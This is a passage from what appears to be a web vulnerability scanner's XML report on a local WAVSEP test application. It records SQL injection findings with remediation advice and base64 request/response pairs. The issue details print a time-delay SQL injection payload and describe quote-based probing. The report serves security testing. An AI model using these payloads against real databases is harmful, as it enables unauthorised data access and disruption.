0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjA0OjAyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0MTENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHRvIHRyaWdnZXIgY2hhbmdlcyBpbiByZXNwb25zZXMgdG8gaW5mZXIgaW5mb3JtYXRpb24uIEdvYWw6IHJldHJpZXZlICdhZG1pbicgcGFzc3dvcmQgaW5qZWN0aW5nIGluIEdFVCBwYXJhbWV0ZXIuPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>1811545660318511104</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case01-InjectionInSearch-RetrieveDatabaseVersion-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case01-InjectionInSearch-RetrieveDatabaseVersion-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMDoyNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2NyaXB0aW9uPC9iPiBUaGUgc2VydmVyIGVuY291bnRlcmVkIGFuIHVuZXhwZWN0ZWQgY29uZGl0aW9uIHRoYXQgcHJldmVudGVkIGl0IGZyb20gZnVsZmlsbGluZyB0aGUgcmVxdWVzdC48L3A+PGhyIGNsYXNzPSJsaW5lIiAvPjxoMz5BcGFjaGUgVG9tY2F0LzguNS44NDwvaDM+PC9ib2R5PjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjI3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogcmV0cmlldmUgZGF0YWJhc2UgdmVyc2lvbiAoSGludDogTXlTUUwpPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDEzDQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAxLUluamVjdGlvbkluU2VhcmNoLVJldHJpZXZlRGF0YWJhc2VWZXJzaW9uLVVuaW9uRXhwbG9pdC5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZz10ZXN0aW5wdXQnJTIwYW5kJTIwKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpLS0lMjA=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA5OjAwOjQ3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0OTkNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDEgLSBJbmplY3Rpb24gaW50byBhIHN0cmluZyB2YWx1ZSBpbiBhIHNlYXJjaCBwYWdlIHdpdGggZXJyb25lb3VzIHJlc3BvbnNlcy4gR29hbDogcmV0cmlldmUgZGF0YWJhc2UgdmVyc2lvbiAoSGludDogTXlTUUwpPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>474863205104452608</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case02-InjectionInSearch-TimeDelay-UnionExploit.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-New-Cases-POST/SInjection-Detection-Evaluation-New-Cases-POST-UnionExploit/Case02-InjectionInSearch-TimeDelay-UnionExploit.jsp [msg parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msg</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the msg parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>' and (select*from(select(sleep(20)))a)-- </b> was submitted in the msg parameter. The application took <b>20008</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QvU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1OZXctQ2FzZXMtUE9TVC1VbmlvbkV4cGxvaXQvQ2FzZTAyLUluamVjdGlvbkluU2VhcmNoLVRpbWVEZWxheS1VbmlvbkV4cGxvaXQuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxMw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLU5ldy1DYXNlcy1QT1NUL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tTmV3LUNhc2VzLVBPU1QtVW5pb25FeHBsb2l0L0Nhc2UwMi1JbmplY3Rpb25JblNlYXJjaC1UaW1lRGVsYXktVW5pb25FeHBsb2l0LmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbXNnPXRlc3RpbnB1dCc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgNTAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxhbmd1YWdlOiBlbg0KQ29udGVudC1MZW5ndGg6IDkwNA0KRGF0ZTogVHVlLCAyMyBBcHIgMjAyNCAwOTowMDoyNyBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhZG9jdHlwZSBodG1sPjxodG1sIGxhbmc9ImVuIj48aGVhZD48dGl0bGU+SFRUUCBTdGF0dXMgNTAwID8gSW50ZXJuYWwgU2VydmVyIEVycm9yPC90aXRsZT48c3R5bGUgdHlwZT0idGV4dC9jc3MiPmJvZHkge2ZvbnQtZmFtaWx5OlRhaG9tYSxBcmlhbCxzYW5zLXNlcmlmO30gaDEsIGgyLCBoMywgYiB7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjojNTI1RDc2O30gaDEge2ZvbnQtc2l6ZToyMnB4O30gaDIge2ZvbnQtc2l6ZToxNnB4O30gaDMge2ZvbnQtc2l6ZToxNHB4O30gcCB7Zm9udC1zaXplOjEycHg7fSBhIHtjb2xvcjpibGFjazt9IC5saW5lIHtoZWlnaHQ6MXB4O2JhY2tncm91bmQtY29sb3I6IzUyNUQ3Njtib3JkZXI6bm9uZTt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGgxPkhUVFAgU3RhdHVzIDUwMCA/IEludGVybmFsIFNlcnZlciBFcnJvcjwvaDE+PGhyIGNsYXNzPSJsaW5lIiAvPjxwPjxiPlR5cGU8L2I+IFN0YXR1cyBSZXBvcnQ8L3A+PHA+PGI+TWVzc2FnZTwvYj4gRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICYjMzk7JSYjMzk7JiMzOTsgYXQgbGluZSAxPC9wPjxwPjxiPkRlc2N